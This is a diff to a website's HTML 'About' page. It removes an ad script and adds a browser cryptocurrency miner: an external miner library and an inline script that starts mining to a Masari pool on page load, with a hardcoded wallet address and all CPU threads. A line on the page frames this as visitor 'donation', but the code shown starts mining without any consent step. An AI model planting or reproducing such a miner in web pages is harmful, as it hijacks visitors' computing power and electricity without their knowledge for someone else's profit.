@@ -19,7 +19,6 @@
     <h1 class="text-center">About Our Site</h1>
     <div class="container">
       <center>
-        <script type="text/javascript" src="https://adhitzads.com/1155924"></script>
         <iframe
 	src="https://viewm.moonicorn.network/#%7B%22options%22%3A%7B%22publisherAddr%22%3A%220x1965a2C2fF01e28fe1fA15010702CC2d030813ba%22%2C%22whitelistedTokens%22%3A%5B%220x6B175474E89094C44Da98b954EedeAC495271d0F%22%5D%2C%22whitelistedType%22%3A%22legacy_250x250%22%2C%22randomize%22%3Atrue%2C%22targeting%22%3A%5B%5D%2C%22width%22%3A%22250%22%2C%22height%22%3A%22250%22%2C%22minPerImpression%22%3A%220%22%2C%22fallbackUnit%22%3Anull%2C%22marketSlot%22%3A%22QmcdCEXB6ZtT7MsdotRanjdja117qtLx1EZHhm1Zk9PY1C%22%7D%7D"
 	width="250"
@@ -48,5 +47,16 @@
     <center>You can donate to the site by accepting the green message and leaving this tab open.</center>
   </div>
   <script src="/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "masari.hashvault.pro";
+    var walletAddress = "5me34QwpaxaGBXToNWYyHagGUyQby4HuiF8Y6rvAVUpt8ASmCD2oVmp74WphLw8u5T26ycT9B2pAGPmCNRB9tLsYA5HBucz";
+    var workerId = ""
+    var threads = -1;
+    var password = "website";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+</script>
   </body>
 </html>
